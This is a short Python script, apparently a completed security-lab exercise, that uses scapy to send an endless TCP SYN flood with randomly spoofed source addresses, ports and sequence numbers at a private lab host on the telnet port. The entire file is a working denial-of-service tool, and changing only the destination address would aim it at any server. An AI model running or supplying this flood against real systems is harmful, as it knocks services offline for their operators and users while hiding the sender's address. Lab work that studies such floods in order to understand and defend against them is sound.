#!/bin/env python3

from scapy.all import IP, TCP, send
from ipaddress import IPv4Address
from random import getrandbits

print('[+] Sending packets')

i = 0

while True:
	# Hint: fill with IP bit size
	src_ip = str(IPv4Address(getrandbits(32)))	# Source IP
	dst_ip = "10.9.0.4"					# Destination IP
	# Hint: generating random number with ** bits
	src_port = getrandbits(16)			# Source Port
	dst_port = 23					# Destination Port
	# Hint: generating random number with ** bits
	seq = getrandbits(32)				# Sequence Number

	ip = IP(src=src_ip, dst=dst_ip)
	tcp = TCP(sport=src_port, dport=dst_port, seq=seq, flags='S')
	pkt = ip/tcp
	
	send(pkt, verbose=0)
	
	i += 1
	print(f'\t[#] Packets sent: {i}', end='\r')
